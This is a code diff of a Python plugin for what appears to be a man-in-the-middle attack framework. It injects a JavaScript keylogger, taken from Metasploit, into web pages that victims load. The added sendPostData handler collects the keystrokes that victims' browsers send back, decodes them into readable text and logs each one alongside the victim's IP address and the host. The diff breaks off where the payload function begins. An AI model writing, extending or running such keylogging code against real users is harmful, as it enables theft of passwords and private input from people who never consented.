@@ -1,16 +1,40 @@
 from plugins.plugin import Plugin
 from plugins.Inject import Inject
+import logging
 
 class jskeylogger(Inject, Plugin):
     name = "Javascript Keylogger"
     optname = "jskeylogger"
     desc = "Injects a javascript keylogger into clients webpages"
+    implements = ["handleResponse","handleHeader","connectionMade", "sendPostData"]
     has_opts = False
 
     def initialize(self,options):
         Inject.initialize(self, options)
         self.html_payload = self.msf_keylogger()
-        print "[*] %s plugin online" % self.name
+        print "[*] Javascript Keylogger plugin online"
+
+    def sendPostData(self, request):
+        #Handle the jskeylogger plugin output
+        if 'keylog' in request.uri:
+            keys = request.postData.split(",")
+            del keys[0]; del(keys[len(keys)-1])
+
+            nice = ''
+            for n in keys:
+                if n == '9':
+                    nice += "<TAB>"
+                elif n == '8':
+                    nice = nice.replace(nice[-1:], "")
+                elif n == '13':
+                    nice = ''
+                else:
+                    try:
+                        nice += n.decode('hex')
+                    except:
+                        print "ERROR: unknown char " + n
+
+            logging.warning("%s [%s] Keys: %s" % (request.client.getClientIP(), request.headers['host'], nice))
 
     def msf_keylogger(self):
         #Stolen from the Metasploit module http_javascript_keylogger
